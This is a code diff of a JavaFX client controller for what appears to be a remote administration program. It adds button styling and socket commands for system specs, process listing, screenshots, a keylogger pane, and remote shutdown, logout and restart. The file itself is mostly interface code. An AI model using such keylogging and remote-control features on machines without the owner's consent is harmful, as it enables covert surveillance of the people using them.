@@ -1,9 +1,13 @@
 package client;
 
+import javafx.event.EventHandler;
 import javafx.fxml.FXML;
 import javafx.fxml.FXMLLoader;
 import javafx.fxml.Initializable;
+import javafx.scene.control.Button;
 import javafx.scene.control.TextField;
+import javafx.scene.input.MouseEvent;
+import javafx.scene.layout.AnchorPane;
 import javafx.scene.layout.Pane;
 
 import java.io.*;
@@ -12,15 +16,23 @@ import java.net.URL;
 import java.util.ResourceBundle;
 
 import com.opencsv.exceptions.CsvValidationException;
+import javafx.stage.Stage;
 
 import javax.swing.*;
 
 public class ClientController implements Initializable {
     @FXML
     private TextField textBox1;
-
     @FXML
     private Pane paneMain;
+    @FXML
+    private Button btnSystem;
+    @FXML
+    private Button btnScreenshot;
+    @FXML
+    private Button btnProcess;
+    @FXML
+    private Button btnKeylogger;
     private Pane paneProcess;
     private Pane paneSystem;
     private Pane paneScreenshot;
@@ -43,7 +55,7 @@ public class ClientController implements Initializable {
     private ClientSystemController clientSystemController;
     private ClientScreenshotController clientScreenshotController;
 
-    private ClientKeyloggerController clientKeyloggerController;
+    public ClientKeyloggerController clientKeyloggerController;
 
     @Override
     public void initialize(URL location, ResourceBundle resources)
@@ -73,7 +85,12 @@ public class ClientController implements Initializable {
         br = new BufferedReader(new InputStreamReader(s.getInputStream()));
         bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
         paneMain.getChildren().clear();
-
+        paneMain.getChildren().add(paneSystem);
+        try {
+            getSpecs();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
     public void writeData(String s) throws IOException
     {
@@ -91,6 +108,10 @@ public class ClientController implements Initializable {
             infoBox("Not connected to server");
             return;
         }
+        btnSystem.setStyle("-fx-background-color: #fd9644");
+        btnKeylogger.setStyle("-fx-background-color: #fefad4");
+        btnScreenshot.setStyle("-fx-background-color: #fefad4");
+        btnProcess.setStyle("-fx-background-color: #fefad4");
         paneMain.getChildren().clear();
         paneMain.getChildren().add(paneSystem);
     }
@@ -101,6 +122,10 @@ public class ClientController implements Initializable {
             infoBox("Not connected to server");
             return;
         }
+        btnProcess.setStyle("-fx-background-color: #fd9644");
+        btnKeylogger.setStyle("-fx-background-color: #fefad4");
+        btnScreenshot.setStyle("-fx-background-color: #fefad4");
+        btnSystem.setStyle("-fx-background-color: #fefad4");
         paneMain.getChildren().clear();
         paneMain.getChildren().add(paneProcess);
         clientProcessController.getRunningProcess();
@@ -112,20 +137,37 @@ public class ClientController implements Initializable {
             infoBox("Not connected to server");
             return;
         }
+        btnScreenshot.setStyle("-fx-background-color: #fd9644");
+        btnKeylogger.setStyle("-fx-background-color: #fefad4");
+        btnSystem.setStyle("-fx-background-color: #fefad4");
+        btnProcess.setStyle("-fx-background-color: #fefad4");
         paneMain.getChildren().clear();
         paneMain.getChildren().add(paneScreenshot);
     }
 
-    public void clickedShutdown() throws IOException
+    public void shutdown(String timer) throws IOException
     {
         writeData("2");
+        writeData(timer);
     }
 
-    public void clickedLogout() throws IOException
+    public void logout(String timer) throws IOException
     {
         writeData("3");
+        writeData(timer);
     }
 
+    public void restart(String timer) throws IOException
+    {
+        writeData("11");
+        writeData(timer);
+    }
+
+    public void getSpecs() throws IOException
+    {
+        writeData("12");
+        clientSystemController.setSpecs();
+    }
     public void clickedKeylogger()
     {
         if (connected == 0)
@@ -133,6 +175,10 @@ public class ClientController implements Initializable {
             infoBox("Not connected to server");
             return;
         }
+        btnKeylogger.setStyle("-fx-background-color: #fd9644");
+        btnSystem.setStyle("-fx-background-color: #fefad4");
+        btnScreenshot.setStyle("-fx-background-color: #fefad4");
+        btnProcess.setStyle("-fx-background-color: #fefad4");
         paneMain.getChildren().clear();
         paneMain.getChildren().add(paneKeylogger);
     }
@@ -147,4 +193,16 @@ public class ClientController implements Initializable {
         writeData("7");
         writeData(name);
     }
+    public void closeServer() throws IOException {
+        clientKeyloggerController.stop();
+        try {
+            writeData("10");
+        }
+        catch (RuntimeException e)
+        {
+            System.out.println("runtime exception");
+        }
+        s.close();
+    }
+
 }
